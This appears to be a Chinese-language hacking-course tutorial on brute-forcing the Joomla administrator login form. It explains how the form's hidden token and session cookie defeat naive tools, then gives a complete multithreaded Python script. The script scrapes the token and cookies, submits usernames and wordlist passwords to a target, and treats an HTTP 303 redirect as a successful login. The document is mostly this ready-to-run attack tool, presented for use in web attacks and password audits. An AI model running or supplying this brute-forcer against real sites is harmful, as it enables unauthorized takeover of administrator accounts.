## 暴力破解joomla带有token和cookie的HTML表单

  在你的Web攻击生涯中，肯定会遇到需要登录目标入口的时候，抑或在提供安全咨询服务时，你可能需要评估现有Web系统的密码强度。现在越来越多的Web系统都会有暴力破解保护，无论是一个验证码、一个简单的数学公式，还是一个登录令牌都必须在发起请求的同时提交。有一批暴力破解工具能够向登录脚本发起进行暴力破解的POST请求，但是在大多数情况下，暴力破解工具不能灵活处理动态内容或者应付简单的“你是人类”的检查。接下来，我们将针对Joomla进行一个简单有效的暴力破解，Joomla是一个流行的内容管理系统。现在的Joomla系统中有包含对抗暴力破解的技术，但是系统的默认值仍然缺乏用户自锁和高强度的验证码。

  为了暴力破解Joomla，我们需要满足两个条件：一是在提交密码前检索登录表单中的登录令牌，二是保证在利用requests建立会话时设置token和cookie值。

为了解析登录表单值，我们将使用Python类BeautifulSoup。使用pip安装：pip install beautifulsoup4。让我们从查看Joomla管理员登录表格开始。Joomla管理员登录表格可以从http://localhost/joomla/administrator/index.php.上浏览到。为了追求简洁，我列出了相关的元素：

 

```html
<form action="/joomla/administrator/index.php" method="post" id="form-login" class="form-inline">
        <input name="username" tabindex="1" id="mod-login-username" type="text" class="input-medium" placeholder="Username" size="15" autofocus="true" />
        <input name="passwd" tabindex="2" id="mod-login-password" type="password" class="input-medium" placeholder="Password" size="15"/>
      <input type="hidden" name="option" value="com_login"/>
      <input type="hidden" name="task" value="login"/>
      <input type="hidden" name="return" value="aW5kZXgucGhw"/>
      <input type="hidden" name="bcbaf78d7170b066e50b7a775ce431a6" value="1" />  </fieldset>
</form>
```

 

![img](img/8d551826-437e-11eb-81f3-8cc6814bc10b.png)

通读这个表单代码，我们找到了需要传递给暴力破解工具的一些有价值的信息。首先，表单的内容通过HTTP协议的POST方法提交给路径/administrator/index.php。在这里，如果你查看最后一个隐藏域值，你会看到它的名称设置成了一个长整型的随机字符串。这是Joomla对抗暴力破解技术的关键。这个随机字符串将在你当前的用户会话中通过存储在cookie中进行检测，如果该随机令牌没有出现，那么即使你使用了正确的认证凭证并传递给登录处理脚本，认证也会失败。这意味着你必须在暴力工具中加入如下流程才能成功破解 Joomla:

  1.检索登录页面，接受所有的token和cookie值。

  2.从HTML中获取所有表单元素。

  3.在你的字典中设置需要猜测的用户名和密码。

  4.发送HTTP POST数据包到登录处理脚本，数据包含所有的HTML表单文件和存储的 token和cookie值。

  5.测试是否能成功登录Web应用。

 

### 代码实现

 

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# @Time     : 2020/11/26 13:59 
# @Author   : ordar
# @File     : http_joomla_form_brute.py
# @Project  : pythonCourse
# @Python   : 3.7.5
import queue
import threading
import requests
from bs4 import BeautifulSoup


user_thread = 5
resume = None
# 设置目标地址,要解析HTML的页面和要尝试暴力破解的位置。
target_index_url = "http://192.168.1.11/administrator/index.php"
target_post_url = "http://192.168.1.11/administrator/index.php"
# 对应的HTML元素
usernmae_field = "username"
password_field = "passwd"
# 检测每一次暴力破解提交的用户名和密码是否登录成功
# 如果响应码为303代表密码正确
success_check = 303


class Bruter:
    def __init__(self, username, words):
        self.username = username
        self.passwords = words
        self.found = False
        print("Finished setting up for: {}".format(username))

    def web_brute(self):
        while not self.passwords.empty() and not self.found:
            brute = self.passwords.get().strip()
            resp = requests.get(target_index_url)
            cookies = resp.cookies.get_dict()
            text = resp.text
            # post提交的表单数据
            all_post_data = {}
            all_post_data[usernmae_field] = self.username
            all_post_data[password_field] = brute
            print("[-] Trying: {}:{}".format(self.username, brute))
            # 使用BeautifulSoup解析html，取出所有的input。然后遍历，取出name和value,再追加到all_post_data里面
            soup = BeautifulSoup(text, "xml")
            all_input = soup.find_all("input")
            for i in all_input:
                # print(i, i['name'])
                if i['name'] != usernmae_field and i['name'] != password_field:
                    # print(i['name'], i['value'])
                    all_post_data[i['name']] = i['value']

            # 提交post表单，data是表单，cookies是携带的cookie，
            # allow_redirects禁止重定向
            resp_post = requests.post(target_post_url, data=all_post_data, cookies=cookies, allow_redirects=False)
            if success_check == resp_post.status_code:
                self.found = True
                print("[*] Brute successful.")
                print('[*] Username:{}'.format(self.username))
                print('[*] Passwd:{}'.format(brute))
                print("[*] Waiting other thread stop")

    def run_brute(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_brute)
            t.start()


# 构建字典队列。
def build_wordlist(wordlist_file):
    """
    读入一个字典文件，然后开始对文件中的每一行进行迭代。
    如果网络连接突然断开或者目标网站中断运行，则我们设置的一些内置函数可以让我们恢复暴力破解会话。
    这可以通过让resume变量接上中断前最后一个尝试暴力破解的路径来轻松实现。
    整个字典文件探测完毕后，返回一个带有全部字符的Queue对象，将在实际的暴力破解函数中使用。
    :param wordlist_file:字典文件
    :return:返回一个带有全部字符的Queue对象
    """
    # 读入字典文件
    with open(wordlist_file, 'r') as f:
        raw_words = f.readlines()
    found_resume = False
    words = queue.Queue()
    # 对字典每一行进行迭代
    for word in raw_words:
        word = word.strip()
        # 判断断点：
        # 如果断点存在就从断点后面开始构建字典队列
        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print("Resuming wordlist from: {}".format(resume))
        else:
            # 没有断点从一开始就构建字典队列
            words.put(word)
    return words


if __name__ == '__main__':
    username = "admin"
    wordlist_file = "wordlist.txt"
    wordlist_queue = build_wordlist(wordlist_file)
    bruter = Bruter(username, wordlist_queue)
    bruter.run_brute()
```

###  运行结果

![img](img/b1e46c12-437e-11eb-995b-8cc6814bc10b.png)

 

 

 